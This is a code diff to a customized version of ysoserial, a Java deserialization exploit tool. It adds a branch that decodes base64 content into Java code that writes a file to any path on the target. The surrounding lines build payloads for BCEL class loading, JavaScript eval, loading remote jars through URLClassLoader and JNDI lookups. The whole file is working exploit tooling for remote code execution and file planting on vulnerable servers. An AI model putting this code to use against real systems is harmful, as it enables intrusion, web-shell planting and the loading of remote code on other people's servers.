@@ -1,7 +1,13 @@
 package ysoserial.payloads.custom;
 
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
 import sun.misc.BASE64Decoder;
 import ysoserial.payloads.util.CommonUtil;
+
+import java.io.FileOutputStream;
+
 import static ysoserial.payloads.custom.CustomCommand.*;
 
 public class TemplatesImplUtil {
@@ -63,11 +69,11 @@ public class TemplatesImplUtil {
             String bcelClassFile = command.substring(COMMAND_BCEL_CLASS_FILE.length());
             String strBCEL = CommonUtil.classToBCEL(bcelClassFile);
             cmd  = String.format("new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"%s\").newInstance();",strBCEL);
-        } else if(command.toLowerCase().startsWith(COMMAND_SCRIPT_FILE)){
+        } else if (command.toLowerCase().startsWith(COMMAND_SCRIPT_FILE)){
             String scriptFilePath = command.substring(COMMAND_SCRIPT_FILE.length());
             String scriptFileByteCode = CommonUtil.byteToByteArrayString(CommonUtil.readFileByte(scriptFilePath));
             cmd = String.format("new javax.script.ScriptEngineManager().getEngineByName(\"js\").eval(new java.lang.String(new byte[]{%s}));",scriptFileByteCode);
-        }else if (command.toLowerCase().startsWith(COMMAND_SCRIPT_BASE64)){
+        } else if (command.toLowerCase().startsWith(COMMAND_SCRIPT_BASE64)){
             // Rhino jdk6 ~ jdk7
             // nashorn jdk8
             String scriptContent = command.substring(COMMAND_SCRIPT_BASE64.length());
@@ -79,6 +85,13 @@ public class TemplatesImplUtil {
             String remoteFilePath = cmdInfo.split("\\|")[1];
             String fileByteCode = CommonUtil.fileContextToByteArrayString(localFilePath);
             cmd = String.format("new java.io.FileOutputStream(\"%s\").write(new byte[]{%s});",remoteFilePath,fileByteCode);
+        } else if (command.toLowerCase().startsWith(COMMAND_UPLOAD_BASE64)){
+            String tmp = command.substring(COMMAND_UPLOAD_BASE64.length());
+            String remoteFilePath = tmp.split("\\|")[0] ;
+            String fileBase64Content = tmp.split("\\|")[1];
+            byte[] fileContent = new BASE64Decoder().decodeBuffer(fileBase64Content);
+            String fileByteCode = CommonUtil.byteToByteArrayString(fileContent);
+            cmd = String.format("new java.io.FileOutputStream(\"%s\").write(new byte[]{%s});",remoteFilePath,fileByteCode);
         } else if (command.toLowerCase().contains(COMMAND_LOADJAR)){
             String cmdInfo = command.substring(COMMAND_LOADJAR.length());
             String jarpath = cmdInfo.split("\\|")[0];
@@ -89,10 +102,10 @@ public class TemplatesImplUtil {
             String cmdInfo = command.substring(COMMAND_LOADJAR_WITH_ARGS.length());
             String jarpath = cmdInfo.split("\\|")[0];
             String className = cmdInfo.split("\\|")[1];
-            String args = cmdInfo.split("|")[2];
+            String args = cmdInfo.split("\\|")[2];
             cmd = String.format("java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL(\"%s\")});" +
                 "classLoader.loadClass(\"%s\").getConstructor(String.class).newInstance(\"%s\");",jarpath,className,args);
-        }else if (command.toLowerCase().contains(COMMAND_JNDI)){
+        } else if (command.toLowerCase().contains(COMMAND_JNDI)){
             String jndiURL = command.substring(COMMAND_JNDI.length());
             cmd = String.format("new javax.naming.InitialContext().lookup(\"%s\");",jndiURL);
         } else {
